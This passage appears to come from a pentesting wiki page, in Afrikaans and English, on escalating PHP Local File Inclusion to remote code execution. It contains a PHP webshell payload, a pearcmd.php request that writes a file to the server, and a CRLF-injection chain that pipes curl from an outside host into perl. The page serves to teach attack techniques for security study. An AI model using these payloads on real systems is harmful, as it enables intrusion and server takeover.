NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Deur php filters (geen lêer nodig nie)

Hierdie [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) verduidelik dat jy **php filters to generate arbitrary content** as output kan gebruik. Dit beteken basies dat jy **generate arbitrary php code** vir die include kan kry **sonder om dit in 'n lêer te skryf**.

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Deur segmentation fault

**Upload** 'n lêer wat as **temporary** in `/tmp` gestoor sal word, dan in die **same request,** 'n **segmentation fault** veroorsaak, en dan sal die **temporary file won't be deleted** — waarna jy daarna kan soek.

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Deur Nginx temp file storage

As jy 'n **Local File Inclusion** gevind het en **Nginx** voor PHP loop, kan jy dalk RCE verkry met die volgende tegniek:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Deur PHP_SESSION_UPLOAD_PROGRESS

As jy 'n **Local File Inclusion** gevind het, selfs al het jy nie 'n sessie nie en `session.auto_start` is `Off`. As jy die **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST** data verskaf, sal PHP die sessie vir jou aktiveer. Jy kan dit misbruik om RCE te kry:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Deur temp file uploads in Windows

As jy 'n **Local File Inclusion** gevind het en die bediener op **Windows** loop, kan jy dalk RCE kry:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Deur `pearcmd.php` + URL args

Soos [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), bestaan die script `/usr/local/lib/phppearcmd.php` standaard in php docker images. Verder is dit moontlik om argumente aan die script via die URL deur te gee omdat aangedui word dat as 'n URL param nie 'n `=` het nie, dit as 'n argument gebruik moet word. Sien ook [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) en [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Die volgende request skep 'n lêer in `/tmp/hello.php` met die inhoud `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Die volgende misbruik 'n CRLF vuln om RCE te kry (van [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Deur phpinfo() (file_uploads = on)

As jy 'n **Local File Inclusion** gevind het en 'n lêer wat **phpinfo()** openbaar met file_uploads = on, kan jy RCE kry:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Deur compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

As jy 'n **Local File Inclusion** gevind het en jy die pad van die temp file kan exfiltrate MAAR die **server** kontroleer of die **lêer wat ingesluit word PHP-merke het**, kan jy probeer om daardie kontrole te omseil met hierdie **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Deur eternal waiting + bruteforce

As jy die LFI kan misbruik om **temporary files** op te laai en die server die PHP-uitvoering te laat **hang**, kan jy dan **brute force** lêernaam deur ure probeer om die temporary file te vind:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Na Fatal Error

As jy enige van die lêers `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` insluit. (Jy moet dieselfde een 2 keer insluit om daardie fout te veroorsaak).

**Ek weet nie hoe dit nuttig is nie, maar dit kan wees.**\
_Even if you cause a PHP Fatal Error, PHP temporary files uploaded are deleted._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Verwysings

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
